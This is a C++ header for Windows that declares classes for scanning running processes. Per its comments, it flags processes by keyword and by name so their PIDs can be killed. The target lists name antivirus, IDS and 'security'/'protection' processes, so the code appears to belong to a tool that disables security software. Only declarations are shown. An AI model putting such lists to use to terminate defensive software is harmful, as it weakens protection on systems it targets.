#pragma once
#ifndef TARG_H
#define TARG_H

#include <winsock2.h>       //Socket Header -	includes scoket functions
#include <windows.h>        //Win API Header -	Windows API functions, use of T/WCHARS
#include <ws2tcpip.h>       //TCP-IP Header -	TCP-IP Defs
#include <tlhelp32.h>       //Toolhelp for windows
#include <vector>
#include <string>



//C Headers
#include <stdio.h>          //Input Output Header    
#include <math.h>           // for mouse capturing
//#include <iostream>         //Input Output Debug Header - this can be commented out for better filesize
//#include <psapi.h>    // For enuamrating procs


class Proc {
    // The Proc (Process) class holds the process details, is inherited by the Targ class
public:
    std::string name;
    int pid;
    int ppid;

    Proc();
    ~Proc();

    // Overloaded Constructor
    Proc(std::string newname, int newpid);
    // Very verloaded constructor
    Proc(std::string newname, int newpid, int newppid);

    // Getters
    std::string getName();
    int getPid();
    int getPpid();

    // Setters
    std::string setName(std::string newname);
    int setPid(int newpid);
    int setPpid(int newpid);
};

class Targ : public Proc {
    // Targ (Target) holds process details for removal and reference
    // This holds target acquisition information for the PID killing process
        // Holds vectors for Suspect Names and Target names
        //  - these can be modified throughout execution
        //  - getters and setters for names and total size
        // Also contains processses (Proc) flagged as a result of scanning
        //  - these also share the same traits as those listed above
        //  - functionailty also exists to handle their PIDS
        // Functionality exists to clear targets and suspects

public:
    // Basic Values for Rollers
        // Adapt as necessary for suspicious phrases
        // Very basic definitions

    Targ();
    ~Targ();

    std::vector<std::string> terms = {
        "virus",
        "security",
        "malware",
        "protection",
        "crypto",
        "protect"
    };
    std::vector<std::string> knowns = {
        "malware.exe",
        "antivirus.exe",
        "IDS.exe",
        "wannacry.exe"
    };

    // Vectors to hold Target / Suspect processes as they are identified
    std::vector<Proc> Targetprocs;
    Proc targetproc;
    std::vector<Proc> Suspectprocs;
    Proc suspectproc;


    // Local vectors - those not inherited through Proc
    std::vector<std::string> targetnames;
    std::vector<int> targetpids;

    std::vector<std::string> suspectnames;
    std::vector<int> suspectpids;

    //Getters
        //Get Names for the rollers
    std::string getSusName(int x);
    std::string getConName(int y);

    // Get specific details about a Proc
    std::string getTargetName(int z);
    int getTargetPid(int u);
    std::string getSuspectName(int v);
    int getSuspectPid(int w);

    // Get the size of vectors for rollers
    int getNosSus();
    int getNosCon();

    // Get size of Target and Suspect Vectors
    int getNosTarget();
    int getNosSuspect();

    // Get the vectors of Proc objects
    std::vector<Proc> getTargets();
    std::vector<Proc> getSuspects();


    //Setters
        // Add a new process to look for
    void addSusName(std::string susName);
    void addConName(std::string conName);

    // Add new details to the vectors, and not those inherited through Proc
    void addTargetName(std::string targetName);
    void addTargetPid(int targetPid);
    void addSuspectName(std::string suspectName);
    void addSuspectPid(int suspectPid);

    // Add new Procs to the Vectors of Procs
    void addTarget(Proc Tproc);
    void addSuspect(Proc Sproc);

    //Resetters
    void resetTargets();

    void resetSuspects();

};
#endif